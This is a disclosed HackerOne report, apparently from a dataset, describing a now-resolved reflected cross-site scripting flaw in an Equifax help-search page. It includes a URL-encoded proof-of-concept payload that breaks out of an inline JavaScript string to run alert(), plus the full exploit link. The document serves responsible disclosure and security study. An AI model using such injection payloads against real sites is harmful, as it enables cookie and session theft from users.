---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1818163'
original_report_id: '1818163'
title: reflected XSS in [www.equifax.com]
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: equifax
created_at: '2022-12-28T19:33:35.404Z'
disclosed_at: '2023-04-23T12:41:20.748Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 42
asset_identifier: '*equifax.com'
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# reflected XSS in [www.equifax.com]

## Metadata

- HackerOne Report ID: 1818163
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: equifax
- Disclosed At: 2023-04-23T12:41:20.748Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

hi , I hope you are well, i found reflected XSS in this endpoint:
```https://www.equifax.com/personal/help/search?search=broook```



###Steps:
1.  open ```https://www.equifax.com/personal/help/search?search=broook```
2. view the source code of the page and search for word  ```broook```  you will find that it reflected in the source code:
{F2094830}



3. ```broook``` word reflected in javascript code:
```
<script type="text/javascript">
           window.onload = function(e){
            	Analytics.trackEvent('emptySearch',{internalSearchTerm: "broook" , numOfSearchResultsReturned: 0});
            	}
           </script>
```


-

-



4. By using this payload ```%22%20%2C%20internalSearchTerm%3A%20%5B7%5D.map%28alert%29%20%2C%20numOfSearchResultsReturned%3A%20%22b```  , I  modified the parameters of the ```Analytics.trackEvent``` function to be like this:
```
<script type="text/javascript">
	      window.onload = function(e){
	          Analytics.trackEvent('SEARCHRETURNED',{internalSearchTerm: "" , internalSearchTerm: [7].map(alert) , numOfSearchResultsReturned: "b" , numOfSearchResultsReturned: 167});            	
	               	}
	     </script>

```
{F2094863}

-
-

5. the following is the link with my XSS payload :   https://www.equifax.com/personal/help/search?search=%22%20%2C%20internalSearchTerm%3A%20%5B7%5D.map%28alert%29%20%2C%20numOfSearchResultsReturned%3A%20%22b


{F2094867}

## Impact

an attacker can exeute JS codes on the victims and this could be steal user's cookies

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
